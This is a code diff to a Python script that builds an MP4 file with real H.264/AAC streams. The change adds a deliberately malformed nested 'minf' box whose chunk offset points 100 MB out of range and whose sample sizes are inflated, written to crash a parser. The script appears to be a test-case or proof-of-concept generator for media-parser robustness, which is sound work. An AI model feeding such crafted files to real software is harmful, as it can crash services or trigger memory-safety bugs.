@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Create a roughly 1 MiB MP4 with real H.264/AAC and nested duplicate minf."""
+"""Create a roughly 1 MiB MP4 with real H.264/AAC and corrupted nested duplicate minf."""
 from __future__ import annotations
 import argparse
 import shutil
@@ -106,8 +106,36 @@ def shift_chunk_offsets(moov: Box, delta: int) -> int:
     return changed
 
 
-def inject_nested_duplicate_minf(moov: Box) -> int:
+def make_corrupted_stco(out_of_range_offset: int) -> Box:
+    """Create a malicious stco box pointing way out of range."""
+    version_flags = struct.pack(">I", 0)
+    # One entry pointing to an invalid offset
+    entry_count = 1
+    payload = version_flags + struct.pack(">I", entry_count) + struct.pack(">I", out_of_range_offset)
+    return Box(b"stco", payload)
+
+
+def make_corrupted_stsz(inflated_size: int) -> Box:
+    """Create a malicious stsz box with inflated sample sizes."""
+    version_flags = struct.pack(">I", 0)
+    # 4 samples with enormous size each
+    sample_count = 4
+    payload = version_flags + struct.pack(">II", inflated_size, sample_count)
+    return Box(b"stsz", payload)
+
+
+def inject_corrupted_nested_duplicate_minf(moov: Box, file_size: int) -> int:
+    """Inject a corrupted duplicate minf immediately after stbl inside the first minf.
+    
+    The corrupted minf contains:
+    - stco pointing way out of range (file_size + 100MB)
+    - stsz claiming 100MB per sample
+    
+    This ensures a crash when the parser tries to use this duplicate.
+    """
     injected = 0
+    out_of_range = file_size + 100_000_000
+    
     for trak in moov.find_all(b"trak"):
         mdia = next((c for c in trak.children or () if c.type == b"mdia"), None)
         if mdia is None:
@@ -121,9 +149,24 @@ def inject_nested_duplicate_minf(moov: Box) -> int:
         stbl_index = next((i for i, c in enumerate(minf.children) if c.type == b"stbl"), None)
         if stbl_index is None:
             continue
-        # Empty minf is exactly an 8-byte box and is immediately after stbl.
-        minf.children.insert(stbl_index + 1, Box(b"minf"))
+        
+        # Create a corrupted stbl inside the duplicate minf
+        corrupted_stbl = Box(
+            b"stbl",
+            b"".join([
+                make_corrupted_stco(out_of_range).to_bytes(),
+                make_corrupted_stsz(100_000_000).to_bytes(),
+            ])
+        )
+        
+        # Create the corrupted minf with the malicious stbl
+        corrupted_minf = Box(b"minf", children=[corrupted_stbl])
+        
+        # Insert it immediately after the original stbl
+        minf.children.insert(stbl_index + 1, corrupted_minf)
         injected += 1
+        print(f"Injected corrupted nested minf (stco={out_of_range}, stsz=100MB)")
+    
     return injected
 
 
@@ -148,11 +191,14 @@ def encode_source(path: Path, target_bytes: int, duration: float) -> None:
 def build(source: Path, output: Path) -> None:
     entries = top_level(source)
     moov_type, moov_offset, moov_size = next(e for e in entries if e[0] == b"moov")
+    file_size = source.stat().st_size
+    
     with source.open("rb") as handle:
         handle.seek(moov_offset)
         moov = parse_boxes(handle.read(moov_size))[0]
+    
     old_size = moov.size
-    injected = inject_nested_duplicate_minf(moov)
+    injected = inject_corrupted_nested_duplicate_minf(moov, file_size)
     if not injected:
         raise ValueError("no video minf/stbl found")
     delta = moov.size - old_size
@@ -166,7 +212,7 @@ def build(source: Path, output: Path) -> None:
             else:
                 src.seek(offset)
                 dst.write(src.read(size))
-    print(f"Injected {injected} nested duplicate minf; moov grew {delta} bytes; shifted {shifted} offsets")
+    print(f"Injected {injected} corrupted nested minf; moov grew {delta} bytes; shifted {shifted} offsets")
 
 
 def main() -> int:
@@ -184,7 +230,9 @@ def main() -> int:
             build(source, args.output)
         size = args.output.stat().st_size
         print(f"Created {args.output} ({size:,} bytes, {size / (1024 * 1024):.2f} MiB)")
-        print("Contains real H.264 video, AAC audio, and an empty nested minf immediately after video stbl.")
+        print("Contains real H.264 video, AAC audio, and a corrupted nested minf with:")
+        print("  - stco pointing 100MB+ out of range")
+        print("  - stsz claiming 100MB per sample")
         return 0
     except (RuntimeError, ValueError, subprocess.CalledProcessError) as exc:
         print(f"Error: {exc}", file=sys.stderr)
